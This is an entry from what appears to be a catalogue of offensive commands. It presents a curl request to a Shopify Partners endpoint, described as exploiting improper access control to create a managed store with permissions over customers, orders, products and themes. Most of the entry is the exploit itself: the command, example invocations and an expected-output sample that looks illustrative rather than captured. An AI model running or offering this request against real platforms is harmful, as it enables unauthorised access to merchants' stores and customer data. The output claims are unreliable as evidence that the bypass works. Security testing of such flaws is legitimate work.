---
data: >-
  curl -X POST 'https://partners.shopify.com/100808/stores/create_managed_store'
  -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H
  'X-CSRF-Token: your-csrf-token' -d '{"store_domain": "myStore1",
  "permissions": ["applications", "customers", "orders", "products", "themes"],
  "message": "", "collaborator_access_code": ""}'
tags:
  - api-exploit
  - http-request
type: command
output: JSON response with store creation details or error
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:57.024Z'
id: a8fcc1ca-0248-4a92-b46c-14de5c390a29
verified: false
validated: true
submitted: true
---
# curl-create-managed-store

## Command

```bash
curl -X POST 'https://partners.shopify.com/100808/stores/create_managed_store' \
  -H 'Content-Type: application/json' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'X-CSRF-Token: your-csrf-token' \
  -d '{"store_domain": "myStore1", "permissions": ["applications", "customers", "orders", "products", "themes"], "message": "", "collaborator_access_code": ""}'
```

## Description

This command uses curl to send a POST request to Shopify's create_managed_store API endpoint, exploiting improper access control to create a new managed store. It includes necessary headers for authentication and a JSON payload specifying the store domain and permissions. Use this in scenarios where testing authorization bypasses in web APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `URL` | Target endpoint URL with organization ID | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-H 'X-Requested-With: XMLHttpRequest'` | Mimics AJAX request | Yes |
| `-H 'X-CSRF-Token: your-csrf-token'` | Anti-CSRF token from session | Yes |
| `-d` | JSON payload with store details | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://partners.shopify.com/100808/stores/create_managed_store' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'X-CSRF-Token: abc123' -d '{"store_domain": "testStore", "permissions": ["applications"], "message": "", "collaborator_access_code": ""}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://partners.shopify.com/100808/stores/create_managed_store' -H 'Content-Type: application/json' -H 'X-Requested-With: XMLHttpRequest' -H 'X-CSRF-Token: abc123' -d '{"store_domain": "myStore1", "permissions": ["applications", "customers", "orders", "products", "themes"], "message": "Test creation", "collaborator_access_code": ""}'
```

## Expected Output

Successful execution returns HTTP 200 with JSON like {"store_id": 12345, "domain": "myStore1.myshopify.com", "status": "created"}. Failure due to permissions shows HTTP 403 or error message about insufficient privileges.

## Related

- [[Related Procedure: Exploit-Improper-Access-Control-to-Create-Managed-Stores]]
